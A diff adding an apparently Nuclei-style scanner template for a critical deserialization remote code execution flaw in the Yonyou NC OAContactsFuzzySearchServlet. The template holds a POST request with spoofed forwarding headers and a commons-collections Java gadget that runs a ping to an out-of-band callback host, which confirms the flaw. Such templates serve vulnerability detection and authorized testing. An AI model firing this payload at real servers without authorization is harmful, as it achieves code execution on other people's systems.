@@ -1,0 +1,26 @@
+id: yonyou-nc-oacontactsfuzzysearchservlet-rce
+
+info:
+  name: 用友NC OAContactsFuzzySearchServlet 反序列化
+  author: SleepingBag945
+  severity: critical
+
+
+http:
+  - raw:
+    - |
+      POST /servlet/~webbd/nc.uap.bs.im.servlet.OAContactsFuzzySearchServlet HTTP/1.1
+      Host: {{Hostname}}
+      X-Forwarded-For: 127.0.0.10
+      X-Originating-IP: 127.0.0.10
+      X-Remote-Addr: 127.0.0.10
+      X-Remote-IP: 127.0.0.10
+
+      {{generate_java_gadget("commons-collections3.1", "ping {{interactsh-url}}", "raw")}}
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "dns"
